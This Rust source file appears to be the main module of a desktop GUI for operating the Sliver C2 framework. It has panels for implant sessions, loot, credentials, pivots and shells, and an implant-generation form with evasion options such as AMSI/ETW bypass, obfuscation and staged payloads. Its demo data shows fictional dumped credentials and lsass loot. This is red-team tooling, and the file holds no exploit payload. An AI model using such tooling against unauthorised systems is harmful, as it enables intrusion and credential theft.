//! The egui operator interface: connection, dockable tables, consoles,
//! file browser, listeners and payload generation.

use std::collections::{HashMap, VecDeque};

use egui_dock::{DockArea, DockState, NodeIndex, Style as DockStyle, TabViewer};
use serde::{Deserialize, Serialize};

use crate::armory::{self, ArmoryIndex, Installed, Package};
use crate::client::{Command, ListenerSpec, ListenerTls, ModuleSpec, Op, PivotInfo, SliverHandle, Target, Update};
use crate::config::{discover_configs, OperatorConfig};
use crate::proto::{clientpb, commonpb};
use crate::settings::{ListenerPreset, Settings};
use crate::theme::Palette;

mod builds;
mod c2prof;
pub(crate) mod certs;
mod collect;
mod ext;
mod files;
mod gallery;
mod generator;
mod hosts;
mod kit;
mod localterm;
mod pivots;
mod procs;
mod report;
mod server;
mod term;
mod winops;

use ext::ExtState;
use files::FileBrowser;
use pivots::PivotForm;

/// Messages from background armory worker threads.
enum ArmoryMsg {
    Index(Result<ArmoryIndex, String>),
    Installed { name: String, result: Result<(), String> },
    Scan(Vec<Installed>),
}

const MAX_EVENTS: usize = 500;
const MAX_CONSOLE_LINES: usize = 2000;

#[derive(Clone, PartialEq, Serialize, Deserialize)]
enum Tab {
    Sessions,
    Jobs,
    Events,
    Graph,
    Loot,
    Creds,
    Armory,
    Console(Target),
    Files(Target),
    Screenshot(Target),
    Shell(u64),
    Modules(Target),
    BeaconTasks(String),
    Pivoting,
    /// Files hosted on the server via Sliver websites (served by HTTP(S) listeners).
    Hosting,
    /// The official sliver-client running in an embedded terminal (the "Sliver Console" tab).
    ServerCli,
    /// A shell on the machine running the GUI (the "Local Terminal" tab).
    LocalTerm,
    /// Process browser for one implant.
    Processes(Target),
    /// Windows registry browser for one implant.
    Registry(Target),
    /// Windows services for one implant.
    Services(Target),
    /// Implant profiles, build history and canaries.
    Builds,
    /// Host inventory with IOC / cleanup checklist.
    Hosts,
    /// Screenshot gallery.
    Gallery,
    /// Server details: certificates, compile targets, builders, AI history.
    Server,
}

impl Tab {
    /// Permanent panels survive restarts in the saved layout; per-implant tabs don't.
    fn is_permanent(&self) -> bool {
        !matches!(self, Tab::Console(_) | Tab::Files(_) | Tab::Screenshot(_) | Tab::Shell(_) | Tab::Modules(_)
            | Tab::BeaconTasks(_) | Tab::Processes(_) | Tab::Registry(_) | Tab::Services(_))
    }
}

/// Default bottom-pane tabs, in order.
const BOTTOM_TABS: &[Tab] = &[
    Tab::ServerCli, Tab::LocalTerm, Tab::Jobs, Tab::Server, Tab::Hosting, Tab::Builds, Tab::Armory, Tab::Loot, Tab::Creds,
    Tab::Pivoting, Tab::Gallery, Tab::Events,
];
/// Default top-pane tabs.
const TOP_TABS: &[Tab] = &[Tab::Sessions, Tab::Graph, Tab::Hosts];

/// The default dock: Sessions / Graph / Hosts on top, everything else below.
/// `focus` (dev hook) makes that tab the active one; the order never changes
/// (the layout is saved on exit, so reordering here would stick).
fn default_dock(focus: Option<&Tab>) -> DockState<Tab> {
    let mut dock = DockState::new(TOP_TABS.to_vec());
    dock.main_surface_mut().split_below(NodeIndex::root(), 0.5, BOTTOM_TABS.to_vec());
    if let Some(loc) = focus.and_then(|t| dock.find_tab(t)) { dock.set_active_tab(loc); }
    dock
}

/// Keep Local Terminal directly to the right of the Sliver Console when they share a
/// pane (layouts saved by an older dev hook put it on the left).
fn place_local_terminal(dock: &mut DockState<Tab>) {
    let (Some((sf, nd, cli)), Some((sf2, nd2, lt))) = (dock.find_tab(&Tab::ServerCli), dock.find_tab(&Tab::LocalTerm)) else { return };
    if (sf, nd) != (sf2, nd2) || lt.0 == cli.0 + 1 || lt.0 > cli.0 { return; }
    if let egui_dock::Node::Leaf { tabs, active, .. } = &mut dock[sf][nd] {
        let current = tabs[active.0].clone();
        let t = tabs.remove(lt.0);
        let at = tabs.iter().position(|x| *x == Tab::ServerCli).map_or(tabs.len(), |i| i + 1);
        tabs.insert(at, t);
        if let Some(i) = tabs.iter().position(|x| *x == current) { active.0 = i; }
    }
}

/// Form state for the Hosted Files tab.
struct HostForm {
    website: String,
    web_path: String,
    content_type: String,
    file: Option<std::path::PathBuf>,
    /// Job ID of the HTTP(S) listener used to build download URLs.
    serve_job: Option<u32>,
}

impl Default for HostForm {
    fn default() -> Self {
        Self { website: "files".into(), web_path: String::new(), content_type: String::new(), file: None, serve_job: None }
    }
}

#[derive(Clone, Copy, PartialEq)]
enum ConnState {
    Disconnected,
    Connecting,
    Connected,
    Error,
}

struct ConsoleLine {
    text: String,
    color: egui::Color32,
    /// HH:MM:SS shown in the gutter (commands and result headers only).
    time: String,
}

impl ConsoleLine {
    fn new(text: impl Into<String>, color: egui::Color32) -> Self {
        Self { text: text.into(), color, time: String::new() }
    }
    fn stamped(text: impl Into<String>, color: egui::Color32) -> Self {
        Self { text: text.into(), color, time: chrono::Local::now().format("%H:%M:%S").to_string() }
    }
}

#[derive(Default)]
struct ConsoleState {
    input: String,
    lines: Vec<ConsoleLine>,
    focus: bool,
    /// Submitted commands (oldest first) and the ↑/↓ cursor into them.
    history: Vec<String>,
    hist_idx: Option<usize>,
}

impl ConsoleState {
    fn push_line(&mut self, text: impl Into<String>, color: egui::Color32) {
        self.lines.push(ConsoleLine::new(text, color));
        trim_console(self);
    }
    fn remember(&mut self, line: &str) {
        if self.history.last().map(String::as_str) != Some(line) {
            self.history.push(line.to_string());
            if self.history.len() > 500 { self.history.remove(0); }
        }
        self.hist_idx = None;
    }
    /// Walk the history with ↑ (older) / ↓ (newer). Returns true if input changed.
    fn browse_history(&mut self, older: bool) -> bool {
        if self.history.is_empty() { return false; }
        let n = self.history.len();
        self.hist_idx = match (self.hist_idx, older) {
            (None, true) => Some(n - 1),
            (None, false) => return false,
            (Some(0), true) => Some(0),
            (Some(i), true) => Some(i - 1),
            (Some(i), false) if i + 1 >= n => None,
            (Some(i), false) => Some(i + 1),
        };
        self.input = self.hist_idx.map(|i| self.history[i].clone()).unwrap_or_default();
        true
    }
}

/// An interactive shell riding a tunnel. In PTY mode output is parsed by a
/// terminal emulator; otherwise raw bytes are appended to a scrollback.
struct ShellState {
    target: Target,
    tunnel_id: u64,
    pty: bool,
    parser: vt100::Parser,
    raw: String,
    input: String,
    closed: bool,
    focus: bool,
    rows: u16,
    cols: u16,
}

impl ShellState {
    fn new(target: Target, tunnel_id: u64, pty: bool) -> Self {
        let (rows, cols) = (34u16, 120u16);
        Self {
            target, tunnel_id, pty,
            parser: vt100::Parser::new(rows, cols, 5000),
            raw: String::new(),
            input: String::new(),
            closed: false,
            focus: true,
            rows, cols,
        }
    }
    fn feed(&mut self, data: &[u8]) {
        if self.pty {
            self.parser.process(data);
        } else {
            self.raw.push_str(&String::from_utf8_lossy(data));
            // Normalise lone carriage returns so egui renders cleanly.
            if self.raw.len() > 400_000 {
                let cut = self.raw.len() - 300_000;
                self.raw.drain(0..cut);
            }
        }
    }
    fn screen_text(&self) -> String {
        if self.pty {
            self.parser.screen().contents()
        } else {
            self.raw.replace('\r', "")
        }
    }
}

/// Which module category the Modules panel is editing.
#[derive(Clone, Copy, PartialEq)]
enum ModKind {
    Assembly,
    Sideload,
    SpawnDll,
    Bof,
    Extension,
    Wasm,
    Env,
}

struct ModuleForm {
    kind: ModKind,
    file: String,
    args: String,
    process: String,
    entry_point: String,
    is_dll: bool,
    amsi_bypass: bool,
    etw_bypass: bool,
    class_name: String,
    method: String,
    arch: String,
    ext_name: String,
    ext_export: String,
    ext_is_bof: bool,
    ext_init: String,
    migrate_pid: String,
    imp_user: String,
    tok_user: String,
    tok_pass: String,
    tok_domain: String,
    env_key: String,
    env_value: String,
    wasm_file: String,
    wasm_name: String,
    wasm_args: String,
}

impl Default for ModuleForm {
    fn default() -> Self {
        Self {
            kind: ModKind::Assembly,
            file: String::new(),
            args: String::new(),
            process: "c:\\windows\\system32\\notepad.exe".into(),
            entry_point: String::new(),
            is_dll: false,
            amsi_bypass: true,
            etw_bypass: true,
            class_name: String::new(),
            method: String::new(),
            arch: "x64".into(),
            ext_name: String::new(),
            ext_export: "go".into(),
            ext_is_bof: true,
            ext_init: String::new(),
            migrate_pid: String::new(),
            imp_user: String::new(),
            tok_user: String::new(),
            tok_pass: String::new(),
            tok_domain: String::new(),
            env_key: String::new(),
            env_value: String::new(),
            wasm_file: String::new(),
            wasm_name: String::new(),
            wasm_args: String::new(),
        }
    }
}

struct GenerateForm {
    os: String,
    arch: String,
    format: i32,
    is_beacon: bool,
    name: String,
    mtls: String,
    http: String,
    dns: String,
    beacon_interval: i64,
    beacon_jitter: i64,
    save_dir: String,
    debug: bool,
    evasion: bool,
    // Obfuscate Go symbol names in the compiled implant (unique per build).
    obfuscate_symbols: bool,
    // Donut ShellcodeConfig (shellcode format only). entropy: 1=none,
    // 2=random names, 3=random names + symmetric encryption (fresh key each
    // build → bytes differ every generation). compress: 1=none, 2=aPLib.
    sc_entropy: u32,
    sc_compress: u32,
    /// Primary transport; its address list is the first C2, the others are fallbacks.
    transport: generator::Transport,
    // Additional transports: WireGuard and implant-chaining pivots.
    wg: String,
    /// WireGuard in-tunnel ports; must match the listener.
    wg_key_port: u32,
    wg_comms_port: u32,
    tcp_pivot: String,
    named_pipe: String,
    /// HTTP C2 profile name (Sliver's `HTTPC2ConfigName`).
    c2_profile: String,
    /// DNS canary domains (comma-separated).
    canary: String,
    // Execution limits (scope guardrails): the implant exits if unmet.
    limit_hostname: String,
    limit_username: String,
    limit_domain_joined: bool,
    /// Kill date, RFC 3339 (e.g. 2026-12-31T23:59:59Z).
    limit_datetime: String,
    /// Staged payload: compile the implant as shellcode (the "stage"), host it on a
    /// stager listener, and build a small msfvenom stub that pulls it. Off = full binary.
    staged: bool,
    /// Stager listener bind port on the server (the stub calls back here).
    stage_bind_port: u16,
    /// Stage protocol: 0 TCP, 1 HTTP, 2 HTTPS.
    stage_protocol: u8,
    /// msfvenom output format for the stub (exe, dll, raw, elf, …).
    stager_format: String,
}

impl Default for GenerateForm {
    fn default() -> Self {
        Self {
            os: "windows".into(),
            arch: "amd64".into(),
            format: 2, // EXECUTABLE
            is_beacon: false,
            name: String::new(),
            mtls: String::new(),
            http: String::new(),
            dns: String::new(),
            beacon_interval: 60,
            beacon_jitter: 30,
            save_dir: dirs::home_dir()
                .map(|h| h.display().to_string())
                .unwrap_or_else(|| ".".into()),
            debug: false,
            evasion: false,
            obfuscate_symbols: true,
            sc_entropy: 3,
            sc_compress: 1,
            transport: generator::Transport::Mtls,
            wg: String::new(),
            wg_key_port: 1337,
            wg_comms_port: 8888,
            tcp_pivot: String::new(),
            named_pipe: String::new(),
            c2_profile: "default".into(),
            canary: String::new(),
            limit_hostname: String::new(),
            limit_username: String::new(),
            limit_domain_joined: false,
            limit_datetime: String::new(),
            staged: false,
            stage_bind_port: 8443,
            stage_protocol: 0,
            stager_format: "exe".into(),
        }
    }
}

struct ListenerForm {
    kind: usize, // 0 mtls, 1 https, 2 dns, 3 stage (TCP), 4 wireguard
    host: String,
    port: u32,
    domain: String,
    secure: bool,
    // Stage listener: the mTLS C2 (host:port) the staged implant calls back to.
    stage_c2: String,
    // HTTP(S) listener: optional website whose hosted files it serves.
    website: String,
    // WireGuard: virtual TCP comms port and key-exchange port (in the tunnel).
    wg_nport: u32,
    wg_key_port: u32,
    // HTTPS certificate (see `ListenerPreset::tls`), plus the generate-cert inputs.
    tls: u8,
    cert: String,
    key: String,
    cert_cn: String,
    cert_sans: String,
    cert_days: u32,
    cert_msg: Option<(bool, String)>,
    /// Name for "save as preset".
    preset_name: String,
    /// Job being edited (Save & restart), or None for a new listener.
    editing: Option<u32>,
    /// The edited listener's settings when opened, to detect changes and to
    /// restore it if the edited version fails to start.
    edit_orig: ListenerPreset,
    /// False when the job wasn't started from this GUI, so fields Sliver
    /// doesn't report (website, WireGuard tunnel ports, stage C2) are guesses.
    edit_known: bool,
}

impl Default for ListenerForm {
    fn default() -> Self {
        Self {
            kind: 0, host: "0.0.0.0".into(), port: 8888, domain: String::new(), secure: true, stage_c2: String::new(),
            website: String::new(), wg_nport: 8888, wg_key_port: 1337, preset_name: String::new(),
            tls: 0, cert: String::new(), key: String::new(), cert_cn: String::new(), cert_sans: String::new(), cert_days: 365, cert_msg: None,
            editing: None, edit_orig: ListenerPreset::default(), edit_known: true,
        }
    }
}

impl ListenerForm {
    fn to_preset(&self, name: &str) -> ListenerPreset {
        ListenerPreset {
            name: name.into(), kind: self.kind, host: self.host.clone(), port: self.port, domain: self.domain.clone(),
            secure: self.secure, website: self.website.clone(), stage_c2: self.stage_c2.clone(),
            wg_nport: self.wg_nport, wg_key_port: self.wg_key_port,
            tls: self.tls, cert: self.cert.clone(), key: self.key.clone(),
        }
    }
    fn load_preset(&mut self, p: &ListenerPreset) {
        self.kind = p.kind.min(4);
        self.host = p.host.clone();
        self.port = p.port;
        self.domain = p.domain.clone();
        self.secure = p.secure;
        self.website = p.website.clone();
        self.stage_c2 = p.stage_c2.clone();
        if p.wg_nport > 0 { self.wg_nport = p.wg_nport; }
        if p.wg_key_port > 0 { self.wg_key_port = p.wg_key_port; }
        self.tls = p.tls.min(2);
        self.cert = p.cert.clone();
        self.key = p.key.clone();
        self.cert_msg = None;
        self.preset_name = p.name.clone();
    }
    fn spec(&self) -> ListenerSpec {
        spec_of_preset(&self.to_preset(""))
    }
}

/// The listener a saved preset / recorded job describes.
fn spec_of_preset(p: &ListenerPreset) -> ListenerSpec {
    match p.kind {
        0 => ListenerSpec::Mtls { host: p.host.clone(), port: p.port },
        4 => ListenerSpec::Wg { host: p.host.clone(), port: p.port, nport: p.wg_nport, key_port: p.wg_key_port },
        1 => ListenerSpec::Https {
            host: p.host.clone(), domain: p.domain.clone(), port: p.port, secure: p.secure, website: p.website.clone(),
            tls: match p.tls {
                1 => ListenerTls::Files { cert: p.cert.clone(), key: p.key.clone() },
                2 => ListenerTls::Acme,
                _ => ListenerTls::Auto,
            },
        },
        3 => ListenerSpec::Stage { bind_host: p.host.clone(), bind_port: p.port, c2: p.stage_c2.clone() },
        _ => ListenerSpec::Dns {
            domains: p.domain.split(',').map(|s| s.trim().to_string()).filter(|s| !s.is_empty()).collect(),
            host: p.host.clone(),
            port: p.port,
            canaries: true,
        },
    }
}

/// Inverse of `spec_of_preset`, for recording a started listener.
fn preset_of_spec(spec: &ListenerSpec) -> ListenerPreset {
    let mut p = ListenerPreset::default();
    match spec {
        ListenerSpec::Mtls { host, port } => { p.kind = 0; p.host = host.clone(); p.port = *port; }
        ListenerSpec::Https { host, domain, port, secure, website, tls } => {
            p.kind = 1; p.host = host.clone(); p.domain = domain.clone(); p.port = *port; p.secure = *secure; p.website = website.clone();
            match tls {
                ListenerTls::Auto => {}
                ListenerTls::Files { cert, key } => { p.tls = 1; p.cert = cert.clone(); p.key = key.clone(); }
                ListenerTls::Acme => p.tls = 2,
            }
        }
        ListenerSpec::Dns { domains, host, port, .. } => { p.kind = 2; p.host = host.clone(); p.port = *port; p.domain = domains.join(","); }
        ListenerSpec::Stage { bind_host, bind_port, c2 } => { p.kind = 3; p.host = bind_host.clone(); p.port = *bind_port; p.stage_c2 = c2.clone(); }
        ListenerSpec::Wg { host, port, nport, key_port } => { p.kind = 4; p.host = host.clone(); p.port = *port; p.wg_nport = *nport; p.wg_key_port = *key_port; }
    }
    p
}

/// The listener-dialog protocol index (see `ListenerForm::kind`) of a job.
fn job_kind(j: &clientpb::Job) -> usize {
    // Stage listeners are named "TCP" (upper case) on v1.7.9.
    let n = j.name.to_ascii_lowercase();
    match n.as_str() { "http" | "https" => 1, "dns" => 2, "wg" => 4, n if n.contains("stage") || n.contains("tcp") => 3, _ => 0 }
}

/// Best guess at a job's settings from what Sliver reports: protocol, port,
/// domains, and for mTLS the bind address in the description.
fn preset_of_job(j: &clientpb::Job) -> ListenerPreset {
    let d = ListenerForm::default();
    let kind = job_kind(j);
    let host = j.description.strip_prefix("mutual tls listener ")
        .and_then(|b| b.rsplit_once(':')).map(|(h, _)| h.to_string())
        .unwrap_or(d.host);
    ListenerPreset {
        kind, host, port: j.port, domain: j.domains.iter().filter(|x| !x.is_empty()).cloned().collect::<Vec<_>>().join(","),
        secure: j.name == "https", wg_nport: d.wg_nport, wg_key_port: d.wg_key_port, ..Default::default()
    }
}

/// `listener_specs` key: job IDs change across server restarts, protocol + port don't.
fn listener_key(server: &str, kind: usize, port: u32) -> String {
    format!("{server}/{kind}/{port}")
}

pub struct SliverApp {
    configs: Vec<OperatorConfig>,
    selected_cfg: usize,
    conn: ConnState,
    conn_error: String,
    version: String,
    handle: Option<SliverHandle>,

    sessions: Vec<clientpb::Session>,
    beacons: Vec<clientpb::Beacon>,
    jobs: Vec<clientpb::Job>,
    names: HashMap<String, String>,
    events: VecDeque<(i64, String, String)>, // (unix time, kind, text)
    events_filter: String,

    consoles: HashMap<String, ConsoleState>,
    files: HashMap<String, FileBrowser>,
    textures: HashMap<String, egui::TextureHandle>,
    shells: HashMap<u64, ShellState>,
    extensions: HashMap<String, Vec<String>>,
    module_forms: HashMap<String, ModuleForm>,
    loot: Vec<clientpb::Loot>,
    creds: Vec<clientpb::Credential>,
    pivots: Option<clientpb::PivotGraph>,
    beacon_tasks: HashMap<String, Vec<clientpb::BeaconTask>>,
    pivot_list: Vec<PivotInfo>,
    pivot_form: PivotForm,
    websites: Vec<clientpb::Website>,
    host_form: HostForm,
    rename_for: Option<(Target, String)>,
    /// User-positioned graph node locations as fractions (0..1) of the graph
    /// pane, keyed by `hostname|name` (stable across reconnects). Absent = auto-placed.
    graph_pos: HashMap<String, egui::Pos2>,

    // Armory (client-side package manager)
    armory_tx: crossbeam_channel::Sender<ArmoryMsg>,
    armory_rx: crossbeam_channel::Receiver<ArmoryMsg>,
    armory_index: Option<ArmoryIndex>,
    armory_status: String,
    armory_busy: bool,
    armory_search: String,
    installed_exts: Vec<Installed>,
    installing: std::collections::HashSet<String>,

    dock: DockState<Tab>,
    pending_open: Vec<Tab>,

    show_listeners: bool,
    show_generate: bool,
    listener_form: ListenerForm,
    generate_form: GenerateForm,
    toast: Option<(f64, bool, String)>,
    /// Contextual hint for the status bar (e.g. what hovering a row allows),
    /// set while something is hovered and shown on the next frame.
    status_hint: std::cell::Cell<Option<&'static str>>,
    /// The hint the status bar showed last frame.
    shown_hint: std::cell::Cell<Option<&'static str>>,
    shot_after: Option<u32>,

    /// State for the extended views (processes, registry, builds, hosts, …).
    ext: ExtState,
    settings: Settings,
    settings_dirty: bool,
    last_save: f64,
    /// Include secrets in exported reports.
    report_secrets: bool,
}

impl SliverApp {
    pub fn new(cc: &eframe::CreationContext<'_>) -> Self {
        let settings = Settings::load();
        crate::theme::init(&cc.egui_ctx, settings.light_theme);
        egui_extras::install_image_loaders(&cc.egui_ctx);

        // Dev-only: focus a named tab (for screenshots). Forces the default
        // layout so the named tab is at the front of its pane.
        let focus_tab = std::env::var("SLIVER_GUI_TAB").ok().and_then(|f| tab_for_key(&f));
        let dock = match (&focus_tab, settings.dock.clone()) {
            (None, Some(v)) => restore_dock(v).unwrap_or_else(|| default_dock(None)),
            _ => default_dock(focus_tab.as_ref()),
        };
        // Positions are fractions of the graph pane; drop entries saved by older
        // builds as absolute pixels.
        let graph_pos = settings.graph_pos.iter()
            .filter(|(_, (x, y))| (0.0..=1.0).contains(x) && (0.0..=1.0).contains(y))
            .map(|(k, (x, y))| (k.clone(), egui::pos2(*x, *y)))
            .collect();
        let (armory_tx, armory_rx) = crossbeam_channel::unbounded::<ArmoryMsg>();

        let mut app = Self {
            configs: discover_configs(),
            selected_cfg: 0,
            conn: ConnState::Disconnected,
            conn_error: String::new(),
            version: String::new(),
            handle: None,
            sessions: Vec::new(),
            beacons: Vec::new(),
            jobs: Vec::new(),
            names: HashMap::new(),
            events: VecDeque::new(),
            events_filter: String::new(),
            consoles: HashMap::new(),
            files: HashMap::new(),
            textures: HashMap::new(),
            shells: HashMap::new(),
            extensions: HashMap::new(),
            module_forms: HashMap::new(),
            loot: Vec::new(),
            creds: Vec::new(),
            pivots: None,
            beacon_tasks: HashMap::new(),
            pivot_list: Vec::new(),
            pivot_form: PivotForm::default(),
            websites: Vec::new(),
            host_form: HostForm::default(),
            rename_for: None,
            graph_pos,
            armory_tx,
            armory_rx,
            armory_index: None,
            armory_status: String::new(),
            armory_busy: false,
            armory_search: String::new(),
            installed_exts: Vec::new(),
            installing: std::collections::HashSet::new(),
            dock,
            pending_open: Vec::new(),
            show_listeners: false,
            show_generate: false,
            listener_form: ListenerForm::default(),
            generate_form: GenerateForm::default(),
            toast: None,
            status_hint: Default::default(),
            shown_hint: Default::default(),
            shot_after: std::env::var("SLIVER_GUI_SHOT").ok().map(|_| {
                std::env::var("SLIVER_GUI_SHOT_FRAMES").ok().and_then(|v| v.parse().ok()).unwrap_or(5)
            }),
            ext: ExtState::default(),
            settings,
            settings_dirty: false,
            last_save: 0.0,
            report_secrets: false,
        };
        if std::env::var("SLIVER_GUI_TAB").is_ok_and(|t| t == "c2profiles") { app.ext.builds_view = 3; }
        if std::env::var("SLIVER_GUI_DEMO").is_ok() {
            app.seed_demo();
            // Demo opens session tabs on top of the focused one; re-focus.
            if let Some(loc) = focus_tab.and_then(|t| app.dock.find_tab(&t)) {
                app.dock.set_active_tab(loc);
            }
        }
        app.armory_rescan();
        app
    }

    /// Populate sample data and a connected state for offline UI preview
    /// (`SLIVER_GUI_DEMO=1`). Not used against a real server.
    fn seed_demo(&mut self) {
        self.conn = ConnState::Connected;
        self.version = "v1.5.42".into();
        let now = chrono::Local::now().timestamp();
        let mk_sess = |id: &str, name, host, user, os, arch, trans, addr, integ, age| clientpb::Session {
            id: id.into(), name, hostname: host, username: user, os, arch, transport: trans,
            remote_address: addr, integrity: integ, last_checkin: now - age, ..Default::default()
        };
        self.sessions = vec![
            mk_sess("a1b2c3d4-1111", "FANCY_PANDA".into(), "WS-FINANCE-07".into(), "ACME\\jdoe".into(), "windows".into(), "amd64".into(), "mtls".into(), "203.0.113.22:51607".into(), "High".into(), 4),
            mk_sess("e5f6a7b8-2222", "BOLD_OTTER".into(), "ubuntu-web-01".into(), "www-data".into(), "linux".into(), "amd64".into(), "https".into(), "203.0.113.9:44120".into(), "".into(), 31),
        ];
        let mk_beacon = |id: &str, name, host, user, addr, done, total, age, next| clientpb::Beacon {
            id: id.into(), name, hostname: host, username: user, remote_address: addr,
            tasks_count: total, tasks_count_completed: done, last_checkin: now - age,
            next_checkin: now + next, os: "windows".into(), arch: "amd64".into(), ..Default::default()
        };
        self.beacons = vec![
            mk_beacon("c9d0e1f2-3333", "QUIET_HERON".into(), "DC01".into(), "ACME\\svc_sql".into(), "203.0.113.40:49882".into(), 7, 8, 12, 48),
            mk_beacon("b3c4d5e6-4444", "LUCID_VIPER".into(), "LAPTOP-7KQ2".into(), "ACME\\msmith".into(), "203.0.113.18:60511".into(), 3, 3, 90, 210),
        ];
        self.jobs = vec![
            clientpb::Job { id: 1, name: "mtls".into(), protocol: "tcp".into(), port: 8888, ..Default::default() },
            clientpb::Job { id: 2, name: "https".into(), protocol: "tcp".into(), port: 443, domains: vec!["cdn.example.com".into()], ..Default::default() },
        ];
        let mk_content = |path: &str, ct: &str, size: u64, sha: &str| (path.to_string(), clientpb::WebContent {
            path: path.into(), content_type: ct.into(), size, sha256: sha.into(),
            original_file: path.trim_start_matches('/').into(), ..Default::default()
        });
        self.websites = vec![clientpb::Website {
            name: "files".into(),
            contents: [
                mk_content("/loader.ps1", "text/plain", 4_812, "9f2c1e4b7a0d33e8c5b6a1f0e2d4c6b8a9e7f1d3c5b7a9e1f3d5c7b9a1e3f5d7"),
                mk_content("/tools/update.exe", "application/octet-stream", 2_457_600, "3b8e0a6c2f4d1e9b7a5c3e1f0d2b4a6c8e0f2d4b6a8c0e2f4d6b8a0c2e4f6d8b"),
            ].into(),
            ..Default::default()
        }];
        for s in &self.sessions { self.names.insert(s.id.clone(), s.name.clone()); }
        for b in &self.beacons { self.names.insert(b.id.clone(), b.name.clone()); }
        self.push_event("info", "connected to server");
        self.push_event("info", "session opened: a1b2c3d4 FANCY_PANDA (WS-FINANCE-07) windows/amd64 @ 203.0.113.22");
        self.push_event("info", "beacon registered: QUIET_HERON (DC01)");
        self.push_event("info", "job-started: [2] https tcp/443");

        // Open a console with sample output to preview interaction.
        let t = Target::session("a1b2c3d4-1111");
        let c = self.consoles.entry(t.key()).or_default();
        for (text, color) in [
            ("❯ whoami", Palette::green()),
            ("[*] execute: whoami", Palette::accent()),
            ("acme\\jdoe", Palette::text()),
            ("❯ ls", Palette::green()),
            ("[*] ls .", Palette::accent()),
            ("drwxr-xr-x   Users", Palette::text()),
            ("-rw-r--r--   notes.txt   2.1 KB", Palette::text()),
        ] {
            c.lines.push(if text.starts_with('❯') || text.starts_with("[*]") { ConsoleLine::stamped(text, color) } else { ConsoleLine::new(text, color) });
        }
        self.dock.push_to_focused_leaf(Tab::Console(t.clone()));

        // Sample loot & creds.
        self.loot = vec![
            clientpb::Loot { id: "l1-aa".into(), name: "sam.hive".into(), file_type: 0, size: 65536, ..Default::default() },
            clientpb::Loot { id: "l2-bb".into(), name: "lsass.dmp".into(), file_type: 0, size: 48_210_944, ..Default::default() },
        ];
        self.creds = vec![
            clientpb::Credential { username: "ACME\\Administrator".into(), hash: "aad3b4...:31d6cfe0d16ae".into(), collection: "DC01".into(), ..Default::default() },
            clientpb::Credential { username: "ACME\\jdoe".into(), plaintext: "Summer2026!".into(), is_cracked: true, collection: "phish".into(), ..Default::default() },
        ];

        // Demo shell.
        let mut sh = ShellState::new(t.clone(), 7, false);
        sh.feed(b"Microsoft Windows [Version 10.0.19045]\r\n(c) Microsoft Corporation.\r\n\r\nC:\\Users\\jdoe> whoami /groups\r\nACME\\Domain Users   Mandatory group\r\nBUILTIN\\Administrators  Enabled\r\nC:\\Users\\jdoe> ");
        self.shells.insert(7, sh);
        self.dock.push_to_focused_leaf(Tab::Shell(7));
        self.dock.push_to_focused_leaf(Tab::Modules(t.clone()));

        // Populate the armory synchronously for the offline preview.
        if let Ok(idx) = armory::fetch_index(armory::DEFAULT_REPO_URL, armory::OFFICIAL_PUBLIC_KEY) {
            self.armory_status = format!("{} extensions · {} aliases", idx.extensions.len(), idx.aliases.len());
            self.armory_index = Some(idx);
        }
        self.installed_exts = armory::installed_extensions();

        let demo_tab = std::env::var("SLIVER_GUI_TAB").unwrap_or_else(|_| "graph".into());
        let active = match demo_tab.as_str() {
            "armory" => Tab::Armory,
            "modules" => Tab::Modules(Target::session("a1b2c3d4-1111")),
            _ => Tab::Graph,
        };
        if let Some(loc) = self.dock.find_tab(&active) {
            self.dock.set_active_tab(loc);
        }
    }

    /// Env-gated self-screenshot (`SLIVER_GUI_SHOT=/path.png`) used for headless
    /// verification. A no-op in normal operation.
    fn maybe_screenshot(&mut self, ctx: &egui::Context) {
        let Some(n) = self.shot_after else { return };
        ctx.request_repaint();
        if n > 0 {
            self.shot_after = Some(n - 1);
            return;
        }
        // Grab the frame that was just painted.
        for ev in ctx.input(|i| i.raw.events.clone()) {
            if let egui::Event::Screenshot { image, .. } = ev {
                if let Ok(path) = std::env::var("SLIVER_GUI_SHOT") {
                    let w = image.size[0] as u32;
                    let h = image.size[1] as u32;
                    let rgba: Vec<u8> = image.pixels.iter().flat_map(|p| p.to_array()).collect();
                    if let Some(buf) = image::RgbaImage::from_raw(w, h, rgba) {
                        let _ = buf.save(&path);
                    }
                }
                self.shot_after = None;
                // Dev-only: also write the engagement report (SLIVER_GUI_REPORT=<path.md>).
                if let Ok(path) = std::env::var("SLIVER_GUI_REPORT") {
                    let _ = std::fs::write(&path, self.report_markdown(false));
                }
                // Dev-only: and the merged timeline as CSV (SLIVER_GUI_TIMELINE_CSV=<path.csv>).
                if let Ok(path) = std::env::var("SLIVER_GUI_TIMELINE_CSV") {
                    let _ = std::fs::write(&path, self.timeline_csv());
                }
                ctx.send_viewport_cmd(egui::ViewportCommand::Close);
                return;
            }
        }
        ctx.send_viewport_cmd(egui::ViewportCommand::Screenshot);
    }

    fn send(&self, cmd: Command) {
        if let Some(h) = &self.handle {
            // Every operator action passes through here: log it for the timeline.
            if let Some((t, what)) = cmd.describe() {
                let target = t.map_or_else(|| "server".to_string(), |t| self.implant_label(&t.key()));
                self.audit(&target, what);
            }
            h.send(cmd);
        }
    }

    fn connect(&mut self, ctx: &egui::Context) {
        let Some(cfg) = self.configs.get(self.selected_cfg).cloned() else {
            self.conn_error = "no operator config selected".into();
            self.conn = ConnState::Error;
            return;
        };
        self.conn = ConnState::Connecting;
        self.conn_error.clear();
        self.handle = Some(crate::client::connect(cfg, ctx.clone()));
    }

    fn disconnect(&mut self) {
        if let Some(h) = &self.handle {
            h.send(Command::Shutdown);
        }
        self.handle = None;
        self.conn = ConnState::Disconnected;
        self.sessions.clear();
        self.beacons.clear();
        self.jobs.clear();
    }

    fn drain_updates(&mut self, ctx: &egui::Context) {
        let mut incoming = Vec::new();
        if let Some(h) = &self.handle {
            while let Ok(u) = h.updates.try_recv() {
                incoming.push(u);
            }
        }
        for u in incoming {
            self.apply_update(u, ctx);
        }
        self.drain_armory();
    }

    fn drain_armory(&mut self) {
        while let Ok(msg) = self.armory_rx.try_recv() {
            match msg {
                ArmoryMsg::Index(Ok(idx)) => {
                    self.armory_status = format!("{} extensions · {} aliases", idx.extensions.len(), idx.aliases.len());
                    self.armory_index = Some(idx);
                    self.armory_busy = false;
                }
                ArmoryMsg::Index(Err(e)) => {
                    self.armory_status = format!("fetch failed: {e}");
                    self.armory_busy = false;
                }
                ArmoryMsg::Installed { name, result } => {
                    self.installing.remove(&name);
                    match result {
                        Ok(()) => self.set_toast(true, &format!("installed {name}")),
                        Err(e) => self.set_toast(false, &format!("install {name} failed: {e}")),
                    }
                    self.armory_rescan();
                }
